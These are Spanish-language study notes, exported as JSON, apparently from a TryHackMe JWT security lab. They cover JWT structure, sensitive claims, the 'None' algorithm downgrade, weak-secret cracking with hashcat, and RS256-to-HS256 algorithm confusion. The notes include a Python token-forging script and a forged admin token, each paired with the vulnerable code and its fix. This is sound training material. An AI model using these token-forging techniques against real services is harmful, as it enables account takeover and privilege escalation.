[
  {
    "title": "3. Sensitive Information Disclosure",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/3-sensitive-information-disclosure/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/3. Sensitive Information Disclosure.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "<h2>Divulgación de Información Sensible</h2>\nEl primer problema común que veremos será la exposición de información en el JWT.\n\nUn acercamiento de manejo de sesiones basado en cookies usa la sesión del lado del servidor para guardar múltiples parámetros. En PHP, por ejemplo, puedes usar `$SESSION['var']=data` para guardar un valor asociado con la sesión de un usuario. Estos valores no se exponen del lado del cliente y por ello sólo pueden ser recuperados del lado del servidor. Sin embargo, con los tokens, las afirmaciones son expuestas ya que el JWT entero se manda al lado del cliente. Algunos ejemplos serían:\n\n- Divulgación de credenciales en hash, o pero, en texto claro si la contraseña se manda como afirmación.\n- Exposición de información de la red interna como IP privada o hostname del servidor de autentificación.\n\n<h4>Ejemplo práctico 1</h4>\nVamos a autentificarnos en nuestra API con la siguiente petición cURL:\n\n`curl -H 'Content-Type: application/json' -X POST -d '{ \"username\" : \"user\", \"password\" : \"password1\" }' http://10.80.190.89/api/v1.0/example1`\n\nEsto nos devuelve un JWT token.\n\n![[Pasted image 20251220151113.png]]\n\nUna vez lo tenemos, decodeamos el body del JWT para ver información sensible. Puedes hacerlo manualmente o usar [JWT.io](https://jwt.io/) para hacerlo.\n\n![[Pasted image 20251220152644.png]]\n\n<h6>El Error de Desarrollo</h6>\nEn el ejemplo, la información sensible fue añadida a las afirmaciones, como se muestra debajo.\n\n```python\npayload = {\n    \"username\" : username,\n    \"password\" : password,\n    \"admin\" : 0,\n    \"flag\" : \"[redacted]\"\n}\n\naccess_token = jwt.encode(payload, self.secret, algorithm=\"HS256\")\n```\n\n<h6>El Arreglo</h6>\nValores como la contraseña o la flag no deberían ser añadidas a los claims (afirmaciones) ya que el JWT será mandado al cliente. En su lugar, estos valores deberían guardarse de forma segura en el backend del servidor. Al ser requeridos, el nombre de usuario puede ser leído de un JWT verificado y usado para comprobar el valor de la flag/contraseña.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=\"HS256\")\n\nusername = payload['username']\nflag = self.db_lookup(username, \"flag\")\n```",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "4. Signature Validation Mistakes",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/4-signature-validation-mistakes/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/4. Signature Validation Mistakes.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "El segundo error común con los JWTs es no verificar correctamente la firma. Si la firma no se verifica correctamente, un atacante puede falsificar un token JWT para ganar acceso a la cuenta del usuario.\n\n----------------------------------------\n<h2>No Verificar la Firma</h2>\nEl primer problema con la validación de la firma es cuando no hay validación de la firma. Si el servidor no verifica la firma del JWT, entonces es posible modificar los claims en el JWT a lo que prefieras que sean.\n\n<h4>Ejemplo Práctico 2</h4>\nNos autentificaremos en la API con:\n\n`curl -H 'Content-Type: application/json' -X POST -d '{ \"username\" : \"user\", \"password\" : \"password2\" }' http://10.80.190.89/api/v1.0/example2`\n\nUna vez autentificados, podemos ver nuestro usuario con:\n\n`curl -H 'Authorization: Bearer [JWT Token]' http://10.80.190.89/api/v1.0/example2?username=user`\n\n![[Pasted image 20251220155740.png]]\n\nSin embargo, vamos a tratar de autentificarnos sin firma para conseguir ser el usuario que queramos. Para ello, tenemos que modificar la claim de admin y el usuario, tanto del body como de la URL.\n\n![[Pasted image 20251220160034.png]]\n\n<h6>El Error de Desarrollo</h4>\nEn el ejemplo, la firma no se comprueba, como podemos ver debajo:\n\n```python\npayload = jwt.decode(token, options={'verify_signature': False})\n```\n\n>[!IMPORTANT] Aunque esto es bastante raro en APIs normales, suele ocurrir en las APIs \"server-to-server\". \n\n<h6>El Arreglo</h6>\nEl JWT siempre debería ser validado o deberían usarse factores de autentificación adicionales, como certificados para la comunicación entre servidores. El JWT puede verificarse dando el secreto (o clave pública) como se muestra debajo.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=\"HS256\")\n```\n\n-----------------------------------\n<h2>Downgrade a None</h2>\nOtro problema es el downgrade del algoritmo de firmado. JWT soporta el algoritmo de firmado `None`, que significa que no se usa firma. Aunque parece una idea \"tonta\", la idea era para la comunicación servidor a servidor, donde la firma del token ya se comprobaba en el proceso de escalado. Si los desarrolladores no requieren verificar el algoritmo, o al menos denegar el algoritmo `None`, puedes cambiar el tipo de algoritmo especificado en el header del JWT, lo que causaría que la librería usada para la verificación siempre devolviera true, permitiendo así falsificar claims del token.\n\n<h4>Ejemplo Práctico 3</h4>\nAutentifícate en la API para recibir tu token JWT y verificar tu usuario. Para realizar este ataque, necesitará alterar manualmente el claim `alg` a `None`. Puedes usar [CyberChef](https://gchq.github.io/CyberChef/)  para dicho propósito. Que no se te olvide poner el punto al final.\n\n![[Pasted image 20251220172813.png]]\n\n<h6>El Error de Desarrollo</h6>\nAunque parece el mismo problema que antes, desde el punto de vista de desarrollo, es más complejo. A veces, los desarrolladores quieren asegurarse de que su implementación admite varios algoritmos de verificación de firmas. La implementación se leería entonces, normalmente, el header del JWT y parsea el algoritmo encontrado en la verificación del componente.\n\n```python\nheader = jwt.get_unverified_header(token)\n\nsignature_algorithm = header['alg']\n\npayload = jwt.decode(token, self.secret, algorithms=signature_algorithm)\n```\n\nEl problema es obvio, si ponemos `None` entonces este se convierte en el algoritmo, con los consecuentes problemas. La librería [Pyjwt](https://pyjwt.readthedocs.io/en/stable/), tiene implementado código seguro para prevenir dicho problema.\n\n<h6>El Arreglo</h6>\nSi se deben soportar múltiples algoritmos, estos deberían ser declarados en el código como un array.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=[\"HS256\", \"HS384\", \"HS512\"])\n\nusername = payload['username']\nflag = self.db_lookup(username, \"flag\")\n```\n\n------------------------------------\n<h2>Secretos Simétricos Débiles</h2>\nSi se usa un algoritmo de firmado simétrico, la seguridad del JWT recae en la fortaleza y la entropía del secreto usado. Si se usa un secreto débil, puede ser posible realizar crackeo offline para recuperar el secreto. Una vez el valor secreto se conoce, puedes ganar acceso alterando las claims y recalculando una firma válida.\n\n<h4>Ejemplo Práctico 4</h4>\nPara este ejemplo, un secreto débil fue usado para generar el JWT. Una vez obtengas el JWT, tienes varias opciones para romper el secreto. Por ejemplo, puedes usar `hashcat` o `john`.\n\n1. Guarda el JWT en un archivo llamado `jwt.txt`.\n   ![[Pasted image 20251220181345.png]]\n2. Descarga una lista de secretos JWT comunes, vamos a usar `wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list`.\n   ![[Pasted image 20251220181524.png]]\n3. Usamos hashcat para crackear el secret.\n   ![[Pasted image 20251220182248.png]]\n4. Ahora construimos el JWT y conseguimos la flag.\n   ![[Pasted image 20251220185838.png]]\n\n<h6>El Error de Desarrollo</h6>\nEl problema ocurre debido a que el secreto JWT usado es muy débil. Esto puede ocurrir si los desarrolladores tienen prisa o copian código de ejemplos.\n\n<h6>El Arreglo</h6>\nUn secreto seguro debe ser utilizado. Este valor será usado en el software y no por humanos, por lo que una string larga y aleatoria debería valer.\n\n---------------------------------------------\n<h2>Confusión del Algoritmo de Firmado</h2>\nEl último problema común con la validación de la firma es cuando se puede realizar un ataque de confusión de algoritmo. Es similar al ataque de downgrade `None`. Sin embargo, pasa específicamente con la confusión entre algoritmos de firmado simétricos y asimétricos. Si se usa un algoritmo asimétrico como RS356, puede ser posible hacer un downgrade del algoritmos a HS256. En estos casos, alguna librerías vuelven por defecto a usar la clave pública como clave simétrica. Como esta es conocida, puedes falsificar el JWT.\n\n<h4>Ejemplo Práctico 5</h4>\nEs similar al ejemplo 3. Excepto por que esta vez el algoritmo `None` no está permitido. Sin embargo, una vez que te autentifiques, también recibirás la clave pública. Como la clave pública no se reconoce como información sensible es común que la puedas encontrar. A veces incluso está incrustada como claim en el JWT. En este ejemplo debes downgradear el algoritmo a HS256 y usar la clave pública para falsificar un token.\n\n```python\nimport base64 \nimport hmac \nimport hashlib \nimport json \n\ndef b64url(data): \n\treturn base64.urlsafe_b64encode(data).decode('utf-8').replace('=', '') \n\n# 1. Datos \npublic_key = \"clave_pública\" \nheader = {\"typ\": \"JWT\", \"alg\": \"HS256\"} \npayload = {\"username\": \"admin\", \"admin\": 1} \n\n# 2. Codificar Header y Payload \njson_header = json.dumps(header, separators=(',', ':')).encode() \njson_payload = json.dumps(payload, separators=(',', ':')).encode() \ndata_to_sign = b64url(json_header) + \".\" + b64url(json_payload) \n\n# 3. Firmar usando la clave pública como secreto HMAC-SHA256 \nsignature = hmac.new( \n\tpublic_key.encode('utf-8'), \n\tdata_to_sign.encode('utf-8'), \n\thashlib.sha256 \n).digest() \n\n# 4. Token final \nprint(data_to_sign + \".\" + b64url(signature))\n```\n\nPuedes usar este código.\n\n1. Obtenemos el token y la clave pública.\n   ![[Pasted image 20251220192434.png]]\n2. Usamos el script de arriba para generar el token.\n   ![[Pasted image 20251220192510.png]]\n3. Obtenemos la flag.\n   ![[Pasted image 20251220192530.png]]\n\n<h6>El Error de Desarrollo</h6>\nEl error en este ejemplo es similar al del ejemplo 3 pero un poco más complejo. Aunque el algoritmo `None` está deshabilitado, el problema principal surge de que se permitan tanto los algoritmos simétricos como los asimétricos.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=[\"HS256\", \"HS384\", \"HS512\", \"RS256\", \"RS384\", \"RS512\"])\n```\n\nHay que tener cuidado especial para no permitir mezclar tipos de algoritmos.\n\n<h6>El Arreglo</h6>\nAunque permitamos ambos algoritmos de firmado, se requiere un poco más de lógica para asegurar que no hay confusión, como se muestra en el ejemplo de abajo.\n\n```python\nheader = jwt.get_unverified_header(token)\n\nalgorithm = header['alg']\npayload = \"\"\n\nif \"RS\" in algorithm:\n    payload = jwt.decode(token, self.public_key, algorithms=[\"RS256\", \"RS384\", \"RS512\"])\nelif \"HS\" in algorithm:\n    payload = jwt.decode(token, self.secret, algorithms=[\"HS256\", \"HS384\", \"HS512\"])\n\nusername = payload['username']\nflag = self.db_lookup(username, \"flag\")\n```",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "2. JSON Web Tokens",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/2-json-web-tokens/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/2. JSON Web Tokens.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "JWTs son tokens autocontenidos que pueden ser usados para transmitir información de sesión de forma segura. Es un estándar abierto, ofreciendo información para cualquier desarrollador o creador de librerías que quiera usarlos.\n\n------------------------------\n<h2>Estructura JWT</h2>\nUn JWT consta de 3 componentes cada uno encodeado en base64 y separado por puntos.\n\n- **Header:** El header normalmente indica el tipo de token, que es JWT, y el algoritmo usado para la firma.\n- **Payload:** El payload es el cuerpo del token que contiene las afirmaciones. Estas son piezas de información ofrecidas para una entidad específica. En JWTs, hay afirmaciones registradas, las cuales son predefinidas por el estándar JWT, y públicas o privadas, las cuales son definidas por el desarrollador.\n- **Signature:** La firma es la parte del token que ofrece un método para verificar la autenticidad de dicho token. La firma se crea usando un algoritmo especificado en el header.\n\n------------------------------------------\n<h2>Algoritmos de Firmado</h2>\nAunque hay varios algoritmos diferentes definidos en el estándar JWT, sólo nos importan 3:\n\n- **None:** El algoritmo None significa que no se utiliza ningún algoritmo para la firma. De manera efectiva, es un JWT sin firma, significando que la verificación de las afirmaciones no puede ser hecha a través de la firma.\n- **Symmetric Signing:** Un algoritmo de firmado simétrico, como HS256, crea la firma añadiendo un valor secreto al header y body del JWT antes de generar un valor hash. La verificación del token puede ser realizada por cualquier sistema conocedor de dicho secreto.\n- **Asymmetric Signing:** Un algoritmo de firmado asimétrico, como RS256, crea la firma usando una clave privada para firmar el header y cuerpo del JWT. Se crea generando el hash y luego encriptando el hash usando la clave privada. La verificación la puede realizar cualquier sistema conocedor de la clave pública asociada a la clave privada utilizada para crear la firma.\n\n-----------------------------------\n<h2>Seguridad en la Firma</h2>\nLos JWT pueden ser encriptados (llamados JWEs), pero la fuerza principal de los JWTs viene de la firma. Una vez que se firma el JWT,  puede mandarse al cliente, quien puede usarlo cuando lo necesite. Podemos tener un servidor de autentificación centralizado que cree los JWTs usados en varias aplicaciones. Cada aplicación puede verificas la firma.",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "5. JWT Lifetimes",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/5-jwt-lifetimes/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/5. JWT Lifetimes.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "<h2>Tiempo de Vida de los Tokens</h2>\nAntes de verificar la firma del token, el tiempo de vida del token debería ser calculado para asegurar que el token no ha expirado. Esto normalmente se hace leyendo el claim `exp` (expiration time) del token y calculando si este sigue siendo válido.\n\nUn problema común es si el valor `exp` es demasiado grande o no está configurado en absoluto. El token sería válido para demasiado tiempo, o nunca expirar. Las cookies pueden ser expiradas del lado del cliente, sin embargo, los JWT no tienen la misma funcionalidad construida. Si queremos expirar un token antes del tiempo `exp`, debemos mantener una blacklist de estos tokens, rompiendo así el modelo centralizado. Es por esto que el foco debería estar en seleccionar el tiempo `exp` adecuado dada la funcionalidad de la aplicación. Otra opción son los refresher tokens.\n\n<h4>Ejemplo Práctico 6</h4>\nEn este ejemplo, la implementación JWT no especificó un valor `exp` lo que implica que los tokens siempre sean válidos. Usa el siguiente token para obtener la flag:\n`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU`\n\n![[Pasted image 20251220210553.png]]\n\n<h6>El Error de Desarrollo</h6>\nComo ya hemos mencionado, el JWT no tiene un valor `exp` por lo que siempre se mantiene vigente.\n\n<h6>El Arreglo</h6>\nUn valor `exp` debería ser añadido a los claims. Una vez añadido, la mayoría de las librerías incluirán revisar dicho valor en sus comprobaciones de validez. Esto puede ser hecho como se muestra aquí debajo:\n\n```python\nlifetime = datetime.datetime.now() + datetime.timedelta(minutes=5)\n\npayload = {\n    'username' : username,\n    'admin' : 0,\n    'exp' : lifetime\n}\n\naccess_token = jwt.encode(payload, self.secret, algorithm=\"HS256\")\n```",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "1. Token-Based Authentication",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/1-token-based-authentication/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/1. Token-Based Authentication.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "<h2>El Auge de las APIs</h2>\nLas Application Programming Interfaces, o APIs para acortar, se han vuelto extremadamente populares. Una de las razones clave para este \"boom\" es la habilidad de crear una API que pueda servir varias interfaces diferentes , como una aplicación web y de móvil al mismo tiempo, lo que permite reutilizar la lógica del servidor y centralizarla.\n\nSin embargo, los nuevos métodos de manejo de sesión también se crearon con el auge de las APIs. Debido a que las cookies están asociadas con las aplicaciones usadas en navegadores (web), estas no suelen funcionar bien para otras interfaces. Aquí es donde el manejo de sesiones basada en tokens entra en juego.\n\n----------------------------------------\n<h2>Manejo de Sesiones basada en Tokens</h2>\nEl manejo de sesiones basada en tokens es un concepto relativamente nuevo. En lugar de usar las cookies automáticas generadas por el navegador, confía en el código del lado del cliente para este proceso. Después de la autentificación la aplicación ofrece un token en el body de la petición. Usando JavaScript del lado del cliente, este token se guarda en el almacenamiento local del navegador.\n\nCuando se hace una nueva petición, el código JavaScript debe cargar el token del almacenamiento en la cabecera. Uno de los tokens más comunes es JSON Web Tokens (JWT), que se pasan mediante el header `Authorization: Bearer`. \n\n-------------------------------------\n<h2>Proyecto API</h2>\nDurante esta unidad realizaremos explotación contra varias APIs. Las APIs pueden ser documentadas usando diversos métodos. Un método popular es crear un proyecto [Postman](https://www.postman.com/) o un archivo [Swagger](https://swagger.io/). La API fue desarrollada en Python Flask, por lo que los ejemplos de código estarán en Python.\n\n---------------------------------------\n<h2>Endpoints API</h2>\nEl proyecto API tiene un sólo endpoint, llamado `<IP>/api/v1.0/exampleX`. donde `X` es sustituida por el número del ejemplo. Este endpoint accede a dos métodos HTTP:\n\n- **POST:** Para autentificar y recibir tu JWT, necesitas hacer una petición POST con las credenciales en formato JSON.\n- **GET:** Para conseguir los detalles sobre tu usuario y realizar la escalada de privilegios para conseguir la flag.\n\n------------------------------------------\n<h2>Credenciales API</h2>\nPara autentificar la API, necesitas mandar un body JSON con credenciales:\n\n- **Username:** user\n- **Password:** passwordX\n\nLa `X` necesita ser reemplazada con el número del ejemplo.\n\n-------------------------------\n<h2>Ejemplos de Peticiones</h2>\nAquí debajo tienes ejemplos de peticiones cURL que puedes realizar a la API.\n\nPara autentificarte puedes mandar:\n\n`curl -H 'Content-Type: application/json' -X POST -d '{ \"username\" : \"user\", \"password\" : \"passwordX\" }' http://10.80.190.89/api/v1.0/exampleX`\n\nPara la verificación del usuario puedes mandar:\n\n`curl -H 'Authorization: Bearer [JWT token]' http://10.80.190.89/api/v1.0/example2?username=Y`\n\nEl componente `[JWT token]` debe ser reemplazado por el JWT recibido de la primera petición. En este caso `Y` puede ser `user` o `admin`.\n\n---------------------------------------------\n<h2>Permisos API</h2>\nEl objetivo principal en cada ejemplo es ganar privilegios de administrador y verificar dichos permisos. Una vez que tengas un JWT válido donde `admin=1`, puedes hacer una petición para ver los detalles del usuario `admin`, consiguiendo así la flag.",
    "modified": "2025-12-21T00:57:18"
  }
]